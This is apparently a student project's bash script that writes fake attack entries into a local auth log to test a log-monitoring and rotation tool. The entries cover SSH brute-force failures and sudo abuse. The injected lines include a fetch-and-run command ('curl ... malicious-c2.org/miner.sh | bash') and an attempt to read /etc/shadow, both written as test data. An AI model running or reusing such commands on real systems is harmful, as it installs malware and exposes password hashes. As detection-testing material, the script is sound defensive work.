#!/usr/bin/env bash
# ==============================================================================
# Script: simulate_attacks.sh
# Purpose: Automated multi-vector attack generator for OS Mini Project demonstration
# Author: NITHIN N | Roll Number: 25BTRPW066
# Course Outcomes: CO2 (Processes), CO4 (Memory), CO5 (I/O & Logs), CO6 (Security & Shell)
# ==============================================================================

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$(dirname "$SCRIPT_DIR")"
LOG_DIR="$BASE_DIR/logs"
TARGET_LOG="$LOG_DIR/auth.log"

mkdir -p "$LOG_DIR"

# Determine Python binary
if [ -x "/usr/local/bin/python3" ]; then
    PYTHON_BIN="/usr/local/bin/python3"
elif [ -x "/usr/bin/python3" ]; then
    PYTHON_BIN="/usr/bin/python3"
else
    PYTHON_BIN="python3"
fi

echo -e "\033[1;36m==============================================================================\033[0m"
echo -e "\033[1;32m      CYBER SENTINEL: AUTOMATED ATTACK & RESOURCE STRESS SIMULATOR\033[0m"
echo -e "\033[1;37m      Student: NITHIN N  |  Roll Number: 25BTRPW066\033[0m"
echo -e "\033[1;36m==============================================================================\033[0m"

ATTACKER_IP="192.168.1.189"

echo -e "\n\033[1;33m[Stage 1/5] Simulating SSH Brute Force Attack from ${ATTACKER_IP}...\033[0m"
for i in {1..5}; do
    TIMESTAMP=$(date "+%b %d %H:%M:%S")
    echo "$TIMESTAMP server sshd[24$i]: Failed password for invalid user admin from $ATTACKER_IP port 5231$i ssh2" >> "$TARGET_LOG"
    echo "  [+] Injected failed SSH login attempt #$i"
    sleep 0.1
done

echo -e "\n\033[1;33m[Stage 2/5] Simulating Privilege Escalation & Command Injection...\033[0m"
TIMESTAMP=$(date "+%b %d %H:%M:%S")
echo "$TIMESTAMP server sudo: attacker : 3 incorrect password attempts ; TTY=pts/2 ; USER=root ; COMMAND=/bin/bash" >> "$TARGET_LOG"
echo "$TIMESTAMP server sudo: evil_user : user NOT in sudoers ; TTY=pts/3 ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow" >> "$TARGET_LOG"
echo "$TIMESTAMP server auditd[882]: USER_CMD=curl -fsSL http://malicious-c2.org/miner.sh | bash" >> "$TARGET_LOG"
echo "  [+] Injected sudo abuse and reverse shell download commands"

echo -e "\n\033[1;33m[Stage 3/5] Simulating I/O Write Storm & Log File Bloat...\033[0m"
echo "  [+] Flooding $TARGET_LOG with 15,000 transaction traces to breach 1.0MB threshold..."
"$PYTHON_BIN" -c "
with open('$TARGET_LOG', 'a') as f:
    for i in range(15000):
        f.write(f'Nov 02 14:15:00 server app-logger[9021]: HIGH_VOLUME_DATA_STREAM transaction_id=0x{i:06x}A9B hash=9f82c40212048f3\\n')
"
LOG_SIZE=$(wc -c < "$TARGET_LOG" | tr -d ' ')
echo -e "  [✓] Current log file size: \033[1;37m$LOG_SIZE bytes\033[0m (Exceeds 1,048,576 byte threshold)"

echo -e "\n\033[1;33m[Stage 4/5] Executing Cyber Sentinel Detection Engine...\033[0m"
"$PYTHON_BIN" "$BASE_DIR/cyber_sentinel.py" scan

echo -e "\n\033[1;33m[Stage 5/5] Triggering Safe Atomic Copytruncate Log Rotation...\033[0m"
"$PYTHON_BIN" "$BASE_DIR/cyber_sentinel.py" rotate

echo -e "\n\033[1;32m==============================================================================\033[0m"
echo -e "\033[1;32m[✓] ALL ATTACK AND LOG ROTATION TESTS COMPLETED SUCCESSFULLY!\033[0m"
echo -e "\033[1;32m==============================================================================\033[0m"
